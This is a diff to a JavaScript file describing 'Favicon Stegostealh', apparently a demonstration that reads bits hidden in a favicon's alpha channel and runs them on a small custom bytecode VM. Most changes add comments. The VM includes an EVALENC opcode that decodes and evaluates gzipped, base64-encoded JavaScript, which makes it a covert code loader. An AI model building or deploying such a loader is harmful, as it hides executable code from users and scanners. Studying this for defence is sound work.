@@ -1,16 +1,22 @@
-// $t@$h
+/* 
+Favicon Stegostealh - A Turing complete method of favicon steganography
+
+Tested with Factorial of 5
+
+$t@$h
+*/
 
 import { gunzipSync } from "https://cdn.skypack.dev/fflate";
 
 // VM Interpreter
 function runVM(bytecode) {
   console.log("[DEBUG] Bytecode length:", bytecode.length);
-  const memory = {};
-  const callStack = [];
-  let ip = 0;
-  let ptr = 0;
+  const memory = {}; // Stores variables and memory cells
+  const callStack = []; // For CALL/RET
+  let ip = 0; // Instruction pointer
+  let ptr = 0; // Pointer for LOAD/STORE operations
 
-  // === First pass: resolve label names to offsets ===
+  // First pass: resolve label names to offsets
   const labels = {};
   let scanIP = 0;
   while (scanIP < bytecode.length) {
@@ -27,7 +33,7 @@ function runVM(bytecode) {
       case 0x07: { // LABEL
         const len = getStrLen();
         const name = new TextDecoder().decode(bytecode.slice(scanIP, scanIP + len));
-        labels[name] = scanIP - 2;
+        labels[name] = scanIP - 2; // Record label address
         scanIP += len;
         break;
       }
@@ -42,7 +48,7 @@ function runVM(bytecode) {
     }
   }
 
-  // === Second pass: run VM ===
+  // Second pass: run VM
   const decodeStr = () => {
     const len = bytecode[ip++];
     const str = new TextDecoder().decode(bytecode.slice(ip, ip + len));
@@ -110,8 +116,8 @@ function runVM(bytecode) {
         break;
       }
       case 0x0B: ptr = bytecode[ip++]; break; // PTRSET
-      case 0x0C: ptr += 1; break;              // PTRINC
-      case 0x0D: ptr -= 1; break;              // PTRDEC
+      case 0x0C: ptr += 1; break; // PTRINC
+      case 0x0D: ptr -= 1; break; // PTRDEC
       case 0x0E: { // LOAD
         const dest = decodeStr();
         memory[dest] = memory[`cell_${ptr}`] ?? "0";
@@ -130,7 +136,7 @@ function runVM(bytecode) {
         }
         break;
       }
-      case 0x11: { // EVALENC
+      case 0x11: { // EVALENC base64-encoded GZIP JS
         const b64 = decodeStr();
         try {
           const bin = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
@@ -147,8 +153,8 @@ function runVM(bytecode) {
         ip++; // dummy var len
         const offset = (bytecode[ip++] << 8) | bytecode[ip++];
         console.log("[CALL offset]", offset);
-        callStack.push(ip);
-        ip = offset;
+        callStack.push(ip); // Save return address
+        ip = offset; // Jump to function
         break;
       }
       case 0x13: { // RET
@@ -156,7 +162,7 @@ function runVM(bytecode) {
           console.warn("[RET] Empty call stack!");
           return;
         }
-        ip = callStack.pop();
+        ip = callStack.pop(); // Return to caller
         break;
       }
       default:
@@ -166,7 +172,7 @@ function runVM(bytecode) {
   }
 }
 
-// === Favicon Stego Extractor ===
+// Favicon Stego Extractor
 const extractAndRunFaviconVM = async (url) => {
   const img = new Image();
   img.crossOrigin = "anonymous";
@@ -174,6 +180,7 @@ const extractAndRunFaviconVM = async (url) => {
 
   await img.decode();
 
+  // Draw image into canvas to access pixels
   const canvas = document.createElement("canvas");
   canvas.width = img.width;
   canvas.height = img.height;
@@ -183,18 +190,19 @@ const extractAndRunFaviconVM = async (url) => {
   const data = ctx.getImageData(0, 0, canvas.width, canvas.height).data;
   const bits = [];
 
+  // Extract LSBs from alpha channel
   for (let i = 0; i < data.length; i += 4) {
     if (data[i + 3] > 0) {
-      bits.push(data[i + 3] & 1);
+      bits.push(data[i + 3] & 1); // Only opaque pixels contribute
     }
   }
 
-  const bytes = [];
+  const bytes = []; // Group into bytes
   for (let i = 0; i < bits.length; i += 8) {
     const byte = bits.slice(i, i + 8).reduce((acc, bit, j) => acc | (bit << (7 - j)), 0);
     bytes.push(byte);
   }
-
+  
   const length = (bytes[0] << 8) | bytes[1];
   const payload = bytes.slice(2, 2 + length);
 
